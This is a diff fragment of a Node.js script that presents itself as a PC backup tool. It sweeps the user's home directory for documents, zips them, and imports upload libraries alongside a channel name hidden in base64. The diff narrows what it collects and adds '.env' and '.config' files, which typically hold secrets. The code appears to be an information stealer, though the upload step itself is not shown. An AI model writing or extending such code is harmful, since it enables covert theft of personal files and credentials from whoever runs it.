@@ -7,16 +7,21 @@ const axios = require('axios');
 const FormData = require('form-data');
 
 const BASE_DIR = os.homedir();
-const TARGET_DIR = path.join(__dirname, 'important_backup');
-const ZIP_FILE_PATH = path.join(__dirname, 'My_PC_Backup.zip');
+// const TARGET_DIR = path.join(__dirname, 'important_backup');
+// const ZIP_FILE_PATH = path.join(__dirname, 'My_PC_Backup.zip');
+const TARGET_DIR = path.join(process.cwd(), 'important_backup');
+const ZIP_FILE_PATH = path.join(process.cwd(), 'My_PC_Backup.zip');
+
 const FILES_TO_EXTRACT = 5;
 
 const SECRET_CHANNEL_NAME = Buffer.from('c2hpbmNoYW5fMDA3', 'base64').toString('utf-8');
 
 const ALLOWED_EXTENSIONS = new Set([
     '.pdf', '.doc', '.docx', '.txt', '.csv',
-    '.jpg', '.png', '.mp4',
-    '.json', '.js', '.py', '.html', '.css'
+    '.jpg', '.png', '.env', '.config',
+    // '.mp4',
+    '.json'
+    // , '.js', '.py', '.html', '.css'
 ]);
 
 const SKIP_FOLDERS = new Set(['appdata', 'node_modules', '.git', '.vscode']);
